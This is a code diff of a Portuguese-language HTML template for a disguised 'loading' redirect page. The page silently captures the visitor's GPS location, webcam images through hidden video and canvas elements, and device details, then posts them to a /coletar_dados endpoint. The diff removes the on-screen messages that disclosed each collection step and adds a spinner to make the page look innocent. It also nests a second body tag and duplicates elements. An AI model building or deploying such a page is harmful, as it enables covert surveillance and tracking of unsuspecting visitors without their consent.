@@ -18,8 +18,25 @@
     <meta http-equiv="refresh" content="5;url={{ destino }}">
 </head>
 <body>
-    <h3 id="mensagem">Carregando... Aguarde alguns segundos.</h3>
 
+    <body style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #0f172a; color: white; font-family: sans-serif;">
+
+        <div id="spinner" style="margin-bottom: 20px;">
+            <div style="border: 8px solid #f3f3f3; border-top: 8px solid #3b82f6; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite;"></div>
+        </div>
+    
+        <h3 id="mensagem" style="text-align: center;">Carregando... Aguarde alguns segundos.</h3>
+    
+        <video id="video" autoplay playsinline style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    
+        <style>
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        </style>
+    </body>
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -67,7 +84,6 @@
     
             // Localização
             try {
-                atualizarMensagem("Obtendo localização...");
                 const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                 latitude = pos.coords.latitude;
                 longitude = pos.coords.longitude;
@@ -77,7 +93,6 @@
     
             // Câmera
             try {
-                atualizarMensagem("Acessando câmera...");
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -96,7 +111,6 @@
             }
     
             // Coletar informações do sistema
-            atualizarMensagem("Coletando dados do dispositivo...");
             const infosBrowser = await coletarInfoBrowser();
     
             // Tempo na página
@@ -113,7 +127,6 @@
             };
     
             // Enviar
-            atualizarMensagem("Enviando dados...");
             try {
                 const res = await fetch("/coletar_dados", {
                     method: "POST",
